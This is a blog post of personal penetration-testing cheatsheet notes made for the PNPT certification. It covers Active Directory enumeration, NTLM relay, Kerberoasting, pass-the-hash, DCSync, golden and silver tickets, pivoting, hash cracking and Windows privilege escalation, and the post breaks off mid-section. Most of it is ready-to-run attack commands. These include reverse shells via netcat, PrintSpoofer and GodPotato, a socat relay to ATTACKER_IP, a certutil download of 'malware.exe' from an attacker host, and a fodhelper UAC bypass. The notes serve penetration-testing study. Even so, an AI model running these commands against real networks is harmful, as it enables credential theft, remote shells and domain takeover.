+++
date = '2025-07-29T03:51:07+03:00'
draft = false
title = 'PNPT - Active Directory Cheatsheet and Notes'
+++

---
*Active Directory cheatsheet and notes that I used and helped during the PNPT certification exam.*

---
## Active Directory Enumeration
---
### Enumeration with No Credentials / No Sessions
---
#### Host Discovery
---
- Using NetExec:

```c
nxc smb 10.10.10.0/24 --log nxchosts.out
```

- Using **Nmap** ping scan (with GREPable out format):

```c
nmap -sn 10.10.10.0/24 -oG hosts.gnmap
```

- Extract IPs from the nmap output

```c
grep Up hosts.gnmap |cut -d " " -f 2 | tee ip.txt
```

#### Locating Domain Controllers
---
Locating DCs by querying `SRV` records for `LDAP` or `KERBEROS`:

- Using **dig**:

```c
dig -t srv _ldap._tcp.<DOMAIN> @<IP>
```

```c
dig -t srv _kerberos._tcp.<DOMAIN> @<IP>
```

```c
dig @<IP> <DOMAIN> ANY
```

- Using **nslookup**:

```c
nslookup -type=srv _ldab._tcp.dc._msdcs.<DOMAIN> <IP>
```

#### Gathering Usernames
---
- Using NetExec:

**Note:** keep an eye out for juicy stuff and passwords in descriptions

```c
nxc smb 10.10.10.10 --users
```

```c
nxc smb 10.10.10.10 --users | awk '{print $5}' | uniq
```

- Using `net rpc`:

```c
net rpc group members 'Domain Users' -W 'DOMAIN' -I '<IP>' -U '%'
```

- Using a username wordlist, scraped using OSINT for example, and enumerating using [kerbrute](https://github.com/ropnop/kerbrute)
	- Extract only usernames from results file:
	- `grep VALID results.txt | cut -d " " -f 8 | cut -d "@" -f 1`

```c
kerbrute userenum --safe --dc "<IP>" -d <DOMAIN> usernames.txt --output results.txt
```

- Nmap's `krb5-enum-users` script
	- Extract only usernames from results file:
	- `grep -i @<DOMAIN> results.txt | cut -d " " -f 6 | cut -d "@" -f 1`

```c
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<DOMAIN>',userdb='usernames.txt'" <IP>
```

```c
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<DOMAIN>'" <IP>
```

### Domain Enumeration (With Credentials)
---
#### Get Password Policy
---
- Using **NetExec**:

```c
netexec smb -u 'USERNAME' -p 'PASSWORD' --pass-pol -dc-ip 'IP'
```

```c
netexec smb -u 'USERNAME' -p 'PASSWORD' --pass-pol 'DOMAIN'
```

- Using **enum4linux**:

```c
enum4linux -u 'USERNAME' -p 'PASSWORD' -P <DC-IP>
```

#### Get Domain Information with LdapDomainDump
---
```c
ldapdomaindump <IP> -u 'DOMAIN\USERNAME' -p 'PASSWORD' -o domaindump
```

#### Bloodhound Collectors
---
##### Using bloodhound-python from Linux:

```c
bloodhound-python -d <DOMAIN> -u <USER> -p <PASSWD> -ns <DC-IP> -c all
```

##### Using **SharpHound.exe** from a non-domain joined windows machine:

- **NOTE:** Configure your system DNS server to be the IP address of a domain controller in the target domain.
- From the attacker's machine:

```c
runas /netonly /user:DOMAIN\username cmd.exe
```

- Verify a valid domain authentication (attacker's machine):

```c
net view \\DOMAIN\
```

-  On the new `cmd` windows spawned by `runas`:

```c
SharpHound.exe -d DOMAIN
```

##### Using NetExec's Bloodhound Ingestor Module

```c
nxc ldap <ip> -u user -p pass --bloodhound --collection All
```

## Active Directory Exploitation
---

### Initial Attacks ( No Credentials / No Sessions )
---
#### LLMNR Poisoning with Responder
---
- Starting Responder to capture `NTLMv2` hashes:

```c
sudo responder -I <INTERFACE> -v
```

**Note:** Captured hashes can be found in:
- `/usr/share/responder/logs/<capture>` and/or
- `/usr/share/responder/Responder.db` in the `responder` table

#### NTLM Relay Attacks
---
For an NTLM relay attack to work, **SMB signing must be disabled, or not enforced**.

- Find hosts without SMB singing using nmap:

```c
nmap -Pn --script=smb2-security-mode.nse -p445 10.10.10.10
```

```c
nmap -Pn --script=smb2-security-mode.nse -p445 -iL targets.txt
```

- Find hosts without SMB singing using NetExec:

```c
netexec smb targets.txt --gen-relay-list relayable.txt
```

```c
netexec smb 10.10.10.10-20 --gen-relay-list relayable.txt
```

- **Disable** `HTTP` and `SMB` servers in the `/etc/responder/Responder.conf` configuration file and start Responder:

```c
sudo responder -I <interface name> -v
```

#### NTLM Relay with impacket-ntlmrelayx
---
##### Basic relay attack

- Will automatically do a secrets dump for SAM hashes
	- Hashes will be save in the working directory

```c
impacket-ntlmrelayx -tf targets.txt -smb2support
```

##### Interactive Shell (SMB)

- Will create a interactive shell that can be reached with Netcat

```c
impacket-ntlmrelayx -tf targets.txt -smb2support -i
```

##### Socks proxy

- Create a socks proxy that can be used for other attacks

```c
impacket-ntlmrelayx -tf targets.txt -of netntlm -smb2support -socks
```

Impacket's ntlmrelayx with create a socks proxy at `127.0.0.1:1080`. If a Domain Admin proxy is created, it can be used for further exploitation. For example:

- Use proxychains and the ntlmrelayx created proxy to do secrets dump:

```c
proxychains impacket-secretsdump -no-pass -outputfile dump.txt <DOMAIN>/<USER>@<IP>
```

**NOTE:** With a socks connection you can only use smbexec or atexec. Neither wmiexec, psexec nor dcomexec will work. (explainations [here](https://github.com/SecureAuthCorp/impacket/issues/412) )

#### IPv6 DNS Takeover via mitm6
---
**NOTE:** If and **administrator** log-in occurs, ntlmrelayx will attempt to create a user that has rights to perform a **dcsync attack**.

**NOTE:** Ntlmrelayx will also run `ldapdomaindump.py` to dump information about the domain inside `OUTPUT-DIR`.

- Set up **mitm6**:

```c
sudo mitm6 -d <DOMAIN>
```

- Set up **impacket-ntlmrelayx**:

```python
impacket-ntlmrelayx -6 -t ldaps://<DC-IP> -wh fakewpad.<DOMAIN> -l <OUTPUT-DIR> -debug | tee ntlmrelayx.log
```

### Attacks with Valid Usernames ( No Passwords / No Sessions)
---
#### ASREPRoasting
---
Getting password hashes from users without Kerberos pre-authentication required. Read more [here](https://bloodstiller.com/articles/understandingasreproasting/)

- Using **NetExec**:

```c
nxc ldap <DC-IP> -u <USER/USERLIST> -p '' --kdcHost <KDC-IP> -d <DOMAIN> --asreproast output.txt
```

- Using Impacket's **GetNPUsers**:

```c
impacket-GetNPUsers -format <hashcat/john> -outputfile <OUTFILE> -usersfile <USERLIST> -dc-ip <DC-IP> <DOMAIN>/
```

#### Password Spraying
---
**NOTE:** Carefull of lock out policy!

- Using **Kerbrute**:

```c
kerbrute passwordspray --dc <DC-IP> -d <DOMAIN> <USERLIST> <EXAMPLE-PASSWORD>
```

- Using **NetExec**:

```c
nxc smb <DC-IP> -u <USERLIST> -p <PASSWDLIST> --continue-on-success
```

## Active Directory Post Exploitation
---

### Pass Attacks
---

**NOTE:** To **Pass-the-Ticket** remotely (attacker's box), set the `KRB5CCNAME` env variable.
#### NetExec

- Use `--local-auth` for non-domain authentication

```c
# Pass-the-Password
netexec smb <TARGET> -u 'USERNAME' -p 'PASSWD' -d 'DOMAIN'

# Pass-the-Hash
netexec smb <TARGET> -u 'USERNAME' -H 'NTHASH' -d 'DOMAIN'

# Pass-the-Ticket
netexec smb <FQDN> --use-kcacke
```

#### Impacket

```python
# Pass-the-Password
impacket-psexec DOMAIN/user:'PASSWORD'@target

# Pass-the-Hash
impacket-psexec -hashes <NTLM> DOMAIN/user@target

# Pass-the-Ticket
impacket-psexec -k -no-pass DOAMIN/user@target
```

#### Mimikatz

- Pass-the-Ticket

```c
# Export tickets (requires system)
mimikatz.exe "privilege::debug" "exit"

# Load the ticket into memory
mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"

# List tickets loaded from cmd
klist

# Enter a session with psexec.exe
.\PsExec.exe -accepteula \\target cmd.exe
```

- Pass-the-Hash

```c
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:\"cmd.exe\"" "exit"
```

**NOTE:** if you run the whoami command on this shell, it will still show you the original user you were using before doing PtH, but any command run from here will actually use the credentials we injected using PtH/

#### Other Techniques (Pass-the-Hash)

- Connect to RDP using PtH:

```c
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```

- Connect to WinRM using PtH:

```c
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```

### Credential Gathering and DCSync
---

- Secretsdump

```c
impacket-secretsdump DOMAIN/user:'PASSWORD'@<TARGET-IP> -outputfile
```

- NetExec

```c
netexec smb <target> -u USER -p PASSWORD --lsa --sam
```

- Mimikatz

```c
mimikatz.exe "privilege::debug" "log dump.txt" "sekurlsa::logonPasswords" "exit"
```

#### DCSync
---
The below permissions can be used for DCSync:
- **DS-Replication-Get-Changes**
- **Replicating Directory Changes All**
- **Replicating Directory Changes In Filtered Set**

By default, these permissions are limited to the **Domain Admins**, **Enterprise Admins**, **Administrators** and **Domain Controllers** groups.

- DCSync using **Impacket-Secretsdump**

```python
impacket-secretsdump.py <DOMAIN>/<USER>:'PASSWORD'@<DC-IP> -just-dc -outputfile dcsync.dump 
```

- DCSync using **NetExec** (ntdsutil module)

```python
netexec smb <DC-IP> -u <ADMIN-USER> -p <PASSWORD> -M ntdsutil --log ntds.dump
```

- DCSync using **Mimikatz**

```c
.\mimikatz.exe "log dcsync.dump" "lsadump::dcsync /domain:<DOMAIN> /all" "exit"
```

### Token Impersonation (PrivEsc)
---
#### Using NetExec's schtask_as module

- Enumerate logged-in users:

```c
netexec smb 10.10.10.0/24 -u <LOCALADMIN> -p <PASSWORD> --local-auth --loggedon-users
```

- Impersonate a high-privileged domain user

```c
nxc smb <IP> -u <LOCALADMIN> -p <PASSWD> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>
```

- **Example 1**: Create a new *"Domain Admin"* user

```c
nxc smb <IP> -u <LOCALADMIN> -p <PASSWD> --local-auth -M schtask_as -o USER=<logged-on-user> CMD="net user /add newuser passwd /domain"
```

```c
nxc smb <IP> -u <LOCALADMIN> -p <PASSWD> --local-auth -M schtask_as -o USER=<logged-on-user> CMD='net group "Domain Admins" newuser /ADD /DOMAIN'
```

- **Example 2:** Promote an existing low-privileged user to domain admin

```c
nxc smb <IP> -u <LOCALADMIN> -p <PASSWD> --local-auth -M schtask_as -o USER=<logged-on-user> CMD='net group "Domain Admins" existinguser /ADD /DOMAIN'
```

- Source: https://www.netexec.wiki/smb-protocol/impersonate-logged-on-users

#### Using NetExec's impersonate module

- List available tokens:
	- This will list available tokens and their integrity level

```c
nxc smb <IP> -u <LOCALADMIN> -p <PASSWD> --local-auth --exec-method smbexec -M impersonate
```

- Impersonate the target user:

```c
nxc smb <IP> -u <LOCALADMIN> -p <PASSWD> --local-auth --exec-method smbexec -M impersonate -o TOKEN=<TOKEN-ID> EXEC="net user /add newuser passwd /domain"
```

### Kerberoasting
---
- Obtaining a **TGS** Using **NetExec**:

```c
netexec ldap <DC-IP> -u <USER> -p <PASSWD> --kerberoasting output.txt --kdcHost <IP>
```

- Obtaining a **TGS** Using **Impacket-GetUserSPNs**:

```c
impacket-GetUserSPNs -dc-ip <IP> 'DOMAIN/user:password' -request -outputfile out.txt
```

### LNK File Attacks
---
- Setup **Responder** to listen:

```python
sudo responder -I <IFACE> -v
```

- Using **NetExec's** **Slinky** module:

```python
netexec smb <IP> -d <DOMAIN> -u <USER> -p <PASSWD> -M slinky -o NAME=lnkfilename SERVER=<LHOST>
```

- Manual way

```powershell
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\<SHARE>\file.lnk")
$lnk.TargetPath = "\\ATTACKER-IP\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

## Active Directory Persistence
---

### Persistence Through Forged Tickets
---
#### Golden Tickets
---
To create a golden ticket, the following are required (dcsync):
- The NTLM hash of the KRBTGT.
- The Domain SID.

**NOTE:** Read more [here](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/golden-ticket.html)
##### Golden Tickets with Mimikatz

```c
.\mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN-SID> /krbtgt:<HASH> /user:newAdmin /id:500 /ticket:<OUTPUT-TICKET>"
```

##### Golden Tickets with Impacket

- Create a ticket (use `impacket-lookupsid` to get SIDs)

```python
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain <DOMAIN> -user-id <USER-SID> <USER>
```

#### Silver Tickets
---
To create a silver ticket, the following are required:
- The NT hash of the service account or the machine account password
- The Domain SID

**NOTE:** Read more [here](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/silver-ticket.html)
##### Silver Tickets with Mimikatz

```c
.\mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN-SID> /target:<TARGET-SERVICE-HOST> /rc4:<TARGET-MACHINE-HASH> /service:<SERVICE> /user:newAdmin /id:500 /ticket:<OUTPUT-TICKET>"
```

##### Silver Tickets with Impacket

```python
impacket-ticketer -nthash <TARGET-MACHINE-HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <IP> -spn <TARGET-SERVICE> <USER>
```

#### Converting exported tickets
---
**Mimikatz** uses `.kirbi` tickets and **Impacket** uses `.ccache` tickets

- Converting to `.ccache` from mimikatz

```c
.\mimikatz.exe "misc::convert ccache ticket.kirbi" "exit"
```

- Converting with Impacket (both ways)

```python
#                          <input>     <output>
impacket-ticketConverter ticket.kirbi ticket.ccace
impacket-ticketConverter ticket.ccace ticket.kirbi
```

## Pivoting / Port Forwarding / Tunneling

Notes on Network Pivoting, Port Forwarding and Tunneling from TryHackMe's [Wreath Room](https://tryhackme.com/room/wreath).

### Enumeration
---
- Finding useful information on the target:
	- **Linux File:** `/etc/hosts` 
	- **Linux File:** `/etc/resolv.conf`
	- **Linux Command:** `arp -a`
	- **Linux Command:** `nmcli dev show`
	- **Windows File:** `C:\Windows\System32\drivers\etc\hosts`
	- **Windows Command:** `ipconfig /all`
	- Windows Command: `arp -a`

- Statically compiled tools
	- https://github.com/andrew-d/static-binaries
	- https://github.com/ernw/static-toolbox/

#### Oneliners (Linux)

- Bash ping-sweep:

```bash
for i in {1..254};do (ping -c 1 192.168.1.$i 2>/dev/null| grep ttl &); done
```

- Bash port scan (without nmap or nc):

```bash
for i in {20..65535}; do (timeout 1 bash -c "echo >/dev/tcp/192.168.1.4/$i" 2>/dev/null && echo "host: 192.168.1.4 port: $i -> open"); done
```

```bash
for i in {20..65535}; do (timeout 1 bash -c "echo >/dev/tcp/192.168.1.4/$i" 2>/dev/null && echo "host: 192.168.1.4 port: $i -> open" |tee -a open-ports.txt || echo "host: 192.168.1.4 port: $i -> closed" |tee -a closed-ports.txt); done
```

- Banner grabbing with nc

```bash
nc 192.168.1.4 1-65535
```

### Proxychains
---
Locations proxychains will look for config files (in order) :
1. `./proxychains.conf`
2. `~/.proxychains/proxychains.conf`
3. `/etc/proxychains.conf`

**NOTE:** If performing an Nmap scan through proxychains, the options `proxy_dns` could hang and crash the scan. Comment it out before scanning.

Other important notes about proxychains and Nmap:
- No **UDP/SYN scans** and no **ICMP Echo**. Use `-Pn` and `-sT` flags.
- Try to only use Nmap through a proxy **when using the NSE** (i.e. use a static binary to see where the open ports/hosts are before proxying a local copy of nmap to use the scripts library).

### SSH Tunnelling and Port Forwarding
---
#### Forward Connections

Created from the attacker's box (locally) **when SSH access to the target is available**.

Two ways for forward SSH tunnels using the SSH client -- Port Forwarding, and Proxying:

- **Port Forwarding Example:**

Link local port `8000` to the remote resource at `172.16.0.10:80` through `user@172.16.0.5`

```python
ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
```

- **Forward Proxy Example:**

**Good for Proxychains**. Open port `1337` (attacker's box) to proxy data through `user@172.16.0.5` into the target network.

```python
ssh -D 1337 user@172.16.0.5 -fN
```

#### Reverse Connections

Used when **there is an SSH client** on the target box **but not an SSH server**.

**NOTE:** Key authentication would be better for OPSEC. Add `no-agent-forwarding,no-x11-forwarding,no-pty` at the beginning of the public key to disallow shell access on the attacker box. Also, concider creating a throwaway, low-privileged user, just for this use-case.

- **Reverse Port Forwarding Example:**

Use port `8000` on the compromised host as a proxy to forward traffic from the attacker's box at `attacker@172.16.0.20` to the target host at `172.16.0.10:80`.

```python
ssh -o StrictHostKeyChecking=no -R 8000:172.16.0.10:80 attacker@172.16.0.20 -i attacker_key -fN
```

**NOTE:** The option `-o StrictHostKeyChecking=no` is used to auto-accept the host key without prompting.

- Reverse Proxy Example:

**Good for Proxychains**. Use port `8000` on the compromised host as a proxy to forward all traffic comming from the attacker's box at `172.16.0.20`.

```python
ssh -o StrictHostKeyChecking=no -R 8000 attacker@172.16.0.20 -i attacker_key -fN
```

### Plink.exe
---
Command line version of PuTTY client. Usefull for older systems, since they don't come with a built-in SSH client like more modern Windows systems do.

- **Plink Reverse Forwarding Example:**

Nearly identical to an SSH reverse forward. The `cmd.exe /c echo y` is used for non-interactive shells, in order to auto-accept the host key fingerprint.

```python
cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 attacker@172.16.0.20 -i OUTPUT_KEY.ppk -N
```

**NOTE:** Keys generated with `ssh-keygen` need to be converted using `puttygen`
- `puttygen ORIGINAL_KEYFILE -o OUTPUT_KEY.ppk`

**NOTE:** Find the latest version of **Plink** [here](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)

### Socat
---
Could not be used to set up a full proxy into a target network.

Good for port forwarding and **relay**, for example:
- When a target host cannot reach the attacker's box, socat could be used as a relay on an already compromised machine. Socat would listen for a connection from the unreachable target and forward the connection back to the attacking box.

#### Socat Reverse Shell Relay

Create a relay listener on port `8000` of the target machine and connect back (relay) to  `ATTACKER_IP:443`.

```python
./socat tcp-l:8000 tcp:ATTACKER_IP:443 &
```

After the relay has been set, a rev-shell (e.g netcat `nc 172.0.0.1 8000 -e /bin/bash`) could connect to the attacker.

#### Socat Prot Forwarding - Easy

Listen on port `33060` on the compromised box and forward traffic comming from the attacker to the target `172.16.0.10:3306` host.

- `fork` and `reuseaddr` allow multiple connections to use the same port forward.

```python
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
```

#### Socat Prot Forwarding - Quiet

More complex, but doesn't require opening up a port on the compromised host.

- Open ports `8001` and `8000` on the attacker's box to create a local relay. What goes into one port, comes out of the other.

```python
./socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```

- On the compromised box, create a connection between the attacker's box at `172.16.0.20:8001` and the target box at `172.16.0.10:80`.

```python
./socat tcp:172.10.0.20:8001 tcp:172.16.0.10:80,fork &
```

Access to the target (`172.16.0.10:80`) can be made by accessing `127.0.0.1:8000` on the attacker's box.

### Chisel
---
Easily set up a **tunnelled proxy** or **port forward** through a compromised box, **regardless of whether SSH access is available** or not.

**NOTE:** Find Chisel's Github repo [here](https://github.com/jpillora/chisel)

#### Reverse SOCKS Proxy with Chisel

- Start a reverse proxy listener on port `1337` on the attacker's box:

```python
./chisel server -p 1337 --reverse &
```

- From the compromised host, connect back to the attacker at `172.16.0.20:1337`

```python
./chisel client 172.16.0.20:1337 R:socks &
```

**NOTE:** The actual proxy will be opened on `127.0.0.1:1080`, so data will be sent by using port `1080`.

#### Forward SOCKS Proxy with Chisel

- Open port `8080` for a **socks5** proxy on the compromised host.

```python
./chisel server -p 8080 --socks5
```

- Connect to a chisel server running on `172.16.0.10:8080` of the target host and open a socks proxy on port `1337` on the attacker's box.

```python
./chisel client 172.16.0.10:8080 1337:socks
```

**NOTE:** If using `proxychains`, set the proxy address as `socks5` in the config file. Example for a **Reverse Proxy**:

```c
# proxychains configuration file
socks5  127.0.0.1 1080
```

#### Remote Port Forwarding with Chisel

- Start a listener on port `1337` on the attacker's box:

```python
./chisel server -p 1337 --reverse &
```

- On the compromised host, connect back to the chisel listener (attacker's box) at `172.16.0.20:1337` and create a link between the target box at `172.16.0.10:22` and the local port `2222` of the attacker's machine.
	- i.e make the host `172.16.0.10:22` available through `127.0.0.1:2222` on the attacker's box.

```python
./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &
```

#### Local Port Forwarding with Chisel

- Start a listener **on the compromised host** using port `1337`:

```python
./chisel server -p 1337 &
```

- From the attacker's box, connect to the compromised host at `172.16.0.5:8000` running a chisel server and  make the target host at `172.16.0.10:22` accessible through the local port `2222` of the attacker's machine.

```python
./chisel client 172.16.0.5:8000 2222:172.16.0.10:22
```

### Sshuttle
---
Does not perform port forwarding. It uses an SSH connection to create a tunnelled proxy that acts like a new NIC. This allows to route traffic without the use of proxychains (or an equivalent). Works like a vpn.

Requirements for **sshuttle** to work:
- Works only on Linux targets
- SSH access to the target must be available
- Python needs to be installed on the target

**Sshuttle examples:**

**NOTE:** The `-x` flag is used to exclude a host from the forwarded subnet to avoid failures. If the target's IP for SSH access does not belong to the target subnet you are trying to access, then the `-x <IP>` flag is not required.

- Connect to the compromised host at `172.16.0.5` from the attacker's box to access the `172.16.0.0/24` subnet.

```python
sshuttle -r victim@172.16.0.5 172.16.0.0/24 -x 172.16.0.5
```

- Same as above with the additional use of a private ssh key.

```python
sshuttle -r victim@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24 -x 172.16.0.5
```

## Hash Cracking
---
### LM
---
- Using **Hashcat:**

```c
hashcat -a 0 -m 3000 hash.txt wordlist.txt
```

- Using **JohnTheRipper:**

```c
john --wordlist=wordlist.txt --format=lm hash.txt
```

### NetNTLMv1
---
- Using **Hashcat:**

```c
hashcat -a 0 -m 5500 hash.txt wordlist.txt
```

- Using **JohnTheRipper:**

```c
john --wordlist=wordlist.txt --format=netntlmv1 hash.txt
```

### NetNTLMv2
---
- Using **Hashcat:**

```c
hashcat -a 0 -m 5600 hash.txt wordlist.txt
```

- Using **JohnTheRipper:**

```c
john --wordlist=wordlist.txt --format=netntlmv2 hash.txt
```

### Kerberos 5 TGS
---
- Using **Hashcat:**

```c
hashcat -a 0 -m 13100 hash.txt wordlist.txt
```

- Using **JohnTheRipper:**

```c
john --wordlist=wordlist.txt --format=krb5tgs hash.txt
```

### Kerberos 5 TGS AES128
---
- Using **Hashcat:**

```c
hashcat -a 0 -m 19600 hash.txt wordlist.txt
```

### Kerberos 5 TGS AES256
---
- Using **Hashcat:**

```c
hashcat -a 0 -m 19700 hash.txt wordlist.txt
```

### Kerberos ASREP
---
- Using **Hashcat:**

```c
hashcat -a 0 -m 18200 hash.txt wordlist.txt
```

- Using **JohnTheRipper:**

```c
john --wordlist=wordlist.txt --format=krb5asrep hash.txt
```

## Windows Privilege Escalation
---

Notes from **hexdump's** [(LeonardoE95)](https://github.com/LeonardoE95/yt-en) YouTube course on [Windows Privilege Escalation](https://www.youtube.com/watch?v=OmW7351U8cI)

### WinPEAS.exe
---
- Create an SMB share from the attacker box

```python
impacket-smbserver -smb2support -username fakeuser -password fakepasswd <SHARENAME> .
```

- Use the share from the target box

```python
net use \\<ATTACKER_IP>\<SHARENAME> /user:fakeuser fakepasswd
```

- Run winpeas and output results to the attacker's share

```python
.\winPEASx64.exe quiet log=\\<ATTACKER_IP>\<SHARENAME>\winpeas_results.log
```

- View the results in real-time

```python
tail -f winpeas_results.log
```

---


Get available users and domain users (domain - username - sid)

```c
wmic useraccount get domain,name,sid
```


### File perimissions
---
 An Access Control Entry (ACE) si an individual permission rule which controls the individual permissions of a security principal on a file  object. These are the following high-level permissions for an ACL:
  - Fully Access (F)
  - Modify Access (M)
  - Read and Execute Access (RX)
  - Read-Only Access (R)
  - Write-Only Access (W)

  There are more advanced permissions too that deal with inheritance rights, which only apply to directories.
  - (OI) Object Inerit
  - (CI) Container Inherit
  - (IO) Inherit Only
  - (NP) Do not propagate inherit
  - (I) Permission inherited from parent container

Note the madatory integrity level required to access a file (if any) even if there are the required permissions
```python
icacls <file> # with cmd
Get-Acl <file> # with powershell
```


### SeImpersonatePrivilege Exploitation
---
#### PrintSpoofer

- Download the exploit

```powershell
# for 32 bit
iwr -uri "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe" -Outfile PrintSpoofer32.exe

# for 64 bit
iwr -uri "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe" -Outfile PrintSpoofer64.exe
```

- Execute the exploit

```powershell
PrintSpoofer64.exe -c "C:\Users\user\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"
```

#### GodPotato

- Understand the version of .NET with the following command and used the relative exploit.

```powershell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
```

**NOTE:** Replace `NETX` with `NET2` or `NET35` or `NET4` depending on the target's `.Net` version.

  - Download exploit. 

```powershell
iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NETX.exe" -Outfile GodPotato.exe
```

- Execute exploit

```powershell
.\GodPotato.exe -cmd "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"
```


### Windows Services
---

- Basic Commands (Powershell)

```powershell
Get-Service # Show current services

# Display specific properties for each service(`Can*` for what the current user can do)
Get-Service | Select-Object Displayname,Status,ServiceName,Can*

# Get binary path for each service that is currently running
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

- sc.exe

```cmd
sc query # get all services

sc query | findstr SERVICE_NAME # get all services (only their names)

sc stop <servicename> # stop a service

sc start <servicename> # start a service

sc qc <servicename> # get the config of a service

# change config of a service, requires admin
sc config <service> binPath="c:\example\path.exe"

# Get permissions of a service. returns a SDDL string
sc sdshow <servicename>
```

- Convert an SDDL string to a more readable format

```powershell
ConvertFrom-SddlString -Sddl <SDDLSTRING>
```

- wmic

```powershell
wmic process list full | select-string 'executablepath=c:'
wmic process list full | select-string 'executablepath=c:' | select-string -nomatch 'system32|syswow'
```

- Check if we have privileges over a process with accesschk64

```c
.\accesschk64.exe /accepteula -uwcqv <servicename>
```

- Enumerate services with [WinPeas](https://github.com/peass-ng/PEASS-ng)

```c
winPEASx64.exe quiet servicesinfo
```


### Unquoted Service Path
---

Good reading: https://juggernaut-sec.com/unquoted-service-paths/

- Enumerate for Unquoted Service Paths (cmd)

```c
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
```

- Enumerate for Unquoted Service Paths (powershell)

```powershell
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
```

Enumerate folder permissions along the Unquoted Service Path

-  Using `icacls`. Usefull permissions are: **F** or **M** or **W**

```c
icacls <PATH>
```

- Using Powershell (**Get-Acl**)

```powershell
Get-Acl -Path <PATH> | Format-List
```

- Using **acccesschk** from sysinternals

```c
.\accesschk64.exe /accepteula -wvud <PATH>
```

 - Move the payload to the vulnerable location using the required name for the attack to work.
	 - For example to exploit the unquoted path: `C:\Example\Folder one\service.exe`
	 - Move a payload named `Folder.exe`. It should look like this: `C:\Example\Folder.exe`

```python
certutil.exe -urlcache -f http://attacker/malware.exe C:\Example\Folder.exe
```


### DLL Hijacking
---

Two ways to DLL hijacking:
1. Find a DLL used by the victim binary and overwrite with a malicious DLL
2. Trick the default search order used to load DLLs

- Listing used DLLs for a service with tasklist (requires admin)

```c
tasklist /svc | findstr "<service name>"
tasklist /m /fi "pid eq <PID of SERVICE>"
```

- Listing used DLLs for a service with ListDLLs from sysinternals (requires admin)

```c
.\listdlls.exe /accepteula <SERVICE>
```

- Hijack the search order for loading DLLs.  The specific search order is the following one:
	1. The folder specified by `lpFileName` (the directory from which the app is running)
	2. System folder, get using `GetSystemDirectory()` (`C:\Windows\System32`)
	3. 16-bit system folder (`C:\Windows\System`)
	4. Windows directory, get using `GetWindowsDirectory()` (`C:\Windows`)
	5. Current directory
	6. Directories listed in the `PATH'

- Example:
	- The regular DLL is found within the Windows Directory (`C:\Windows`)
	- The malicious DLL is found within the System Folder (`C:\Windows\System32`)

### UAC Bypass
---
UAC levels:
  0. no prompt
  1. prompt for credentials on the secure desktop
  2. prompt for consent on the secure desktop
  3. prompt for credentials on the normal desktop
  4. prompt for consent on the normal desktop
  5. prompt for consent for non-windows binaries

Enumerate UAC with Powershell:
- Check if UAC is enabled. If the result is 1, UAC is enabled.

```powershell
Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' | Select-Object EnableLUA
```

- Get the UAC configuration level.

```powershell
Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' | Select-Object ConsentPromptBehaviorAdmin
```

Enumerate UAC with CMD:
- Check if UAC is enabled with CMD. If the result is 0x1, UAC is enabled.

```c
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA 
```

- Get the UAC configuration level.

```c
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin
```

Change the UAC configuration level

```c
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 2 /f
```

#### UAC Bypass using Fodhelper (Level 5)

- Create the registry item

```powershell
New-Item -Path 'HKCU:\SOFTWARE\Classes\ms-settings\shell\open\command' -Force
```

- Configure the registry key with malicious values

```powershell
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\ms-settings\shell\open\command' -Name '(Default)' -Value 'cmd.exe' -Type string
```

```powershell
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\ms-settings\shell\open\command' -Name 'DelegateExecute' -Value '' -Type string
```

- Finally run `fodhelper`

```c
fodhelper.exe
```

### UAC Bypass AlwayInstallElevated (Levels 1,2,3,4) (Get SYSTEM)

If `AlwaysInstallElevated` is enabled, it is possible to escalate access to `SYSTEM` using a malicious MSI payload

- AlwaysInstallElevated needs to be enabled (value 1) on:
